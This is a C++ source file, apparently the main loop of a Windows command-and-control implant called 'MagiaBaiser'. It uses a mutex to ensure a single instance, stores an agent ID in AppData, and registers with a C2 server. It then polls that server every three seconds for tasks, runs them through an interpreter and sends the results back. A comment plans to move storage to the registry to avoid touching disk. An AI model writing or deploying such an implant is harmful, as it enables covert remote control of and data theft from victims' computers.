#include "functions.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
    CreateMutex(0, FALSE, L"Local\\$MagiaBaiser$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    //rewrite, use registry so we dont touch disk
    PWSTR config_path;
    std::wstring agent_id;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &config_path);
    wcscat(config_path, L"\\MB");
    CreateDirectoryW(config_path,NULL);
    wcscat(config_path, L"\\.id");
    if (GetFileAttributes(config_path) != INVALID_FILE_ATTRIBUTES) {
        std::wifstream cfg_file(config_path);
        std::getline(cfg_file, agent_id);
        cfg_file.close();
    }
    else {  
        nlohmann::json registration = communication::RegisterAgent(C2);
        agent_id = std::to_wstring(registration["agent_id"].get<int>());
        std::wofstream cfg_file(config_path);
        cfg_file << agent_id;
        cfg_file.close();
    }

    while (true) {
        nlohmann::json task = communication::FetchTask(C2, agent_id);

        if (task.contains("task")) {
            nlohmann::json results;
            results["result"] = misc::WideStringToUTF8(interpreter::InterpretTask(misc::UTF8ToWideString(task["task"]), agent_id));
            communication::SubmitResults(C2, agent_id, results);
        }

        Sleep(3000);
    }

    return 0;


}